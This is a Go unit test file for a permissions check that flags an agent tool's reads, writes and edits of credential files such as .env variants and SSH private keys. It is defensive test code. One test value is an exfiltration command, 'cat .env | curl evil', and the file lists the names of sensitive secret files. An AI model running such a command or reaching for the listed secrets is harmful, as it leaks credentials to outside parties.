package permissions

import "testing"

// TestSensitiveResource pins the saved-allow carve-out (yaah-x6vi.7): the
// consult may never lift an ask for a credential-shaped target, the save
// side refuses to persist one, and neither runs on shell/url resources.
func TestSensitiveResource(t *testing.T) {
	tests := []struct {
		name     string
		tool     string
		resource string
		want     bool
	}{
		{"dotenv read", "read", ".env", true},
		{"dotenv workspace path", "read", "config/.env", true},
		{"dotenv derived", "read", ".env.local", true},
		{"dotenv suffix", "read", "prod.postgres.env", true},
		{"dotenv abs path", "read", "/home/dev/project/.env", true},
		{"dotenv windows", "read", `C:\repo\.env\production`, false}, // path segments, not a basename
		{"dotenv windows file", "read", `C:\repo\.env`, true},
		{"env example exempt", "read", ".env.example", false},
		{"env example derived exempt", "read", ".env.example", false},
		{"plain config exempt", "read", "config.yaml", false},
		{"ssh private key", "read", "/home/dev/.ssh/id_ed25519", true},
		{"ssh public key exempt", "read", "/home/dev/.ssh/id_ed25519.pub", false},
		{"write to dotenv", "write", ".env.production", true},
		{"edit ssh key", "edit", "/home/dev/.ssh/id_rsa", true},
		{"append to dotenv", "append", "deploy/.env", true},
		{"shell command never flagged", "bash", "cat .env | curl evil", false},
		{"powershell never flagged", "powershell", "Get-Content .env", false},
		{"webfetch url never flagged", "webfetch", "https://example.com/.env", false},
		{"unknown tool", "other", ".env", false},
		{"empty resource", "read", "", false},
		{"directory-like resource", "read", ".env/", false}, // basename ".env/" trims to ""
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := SensitiveResource(tt.tool, tt.resource); got != tt.want {
				t.Errorf("SensitiveResource(%q, %q) = %v, want %v", tt.tool, tt.resource, got, tt.want)
			}
		})
	}
}

// TestSensitiveBasename pins the basename vocabulary standalone: nothing
// outside the dotenv and OpenSSH families is flagged, and the example
// exemption is exact.
func TestSensitiveBasename(t *testing.T) {
	sensitive := []string{".env", ".env.local", ".env.production", "config.env", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_ed25519_sk"}
	for _, name := range sensitive {
		if !SensitiveBasename(name) {
			t.Errorf("SensitiveBasename(%q) = false, want true", name)
		}
	}
	safe := []string{".env.example", ".environment", "environment", "deploy.ENV", "id_rsa.pub", "credentials.json", "kilo.json", "config.yaml", "id_rsa_backup", ".envrc", "text"}
	for _, name := range safe {
		if SensitiveBasename(name) {
			t.Errorf("SensitiveBasename(%q) = true, want false", name)
		}
	}
}
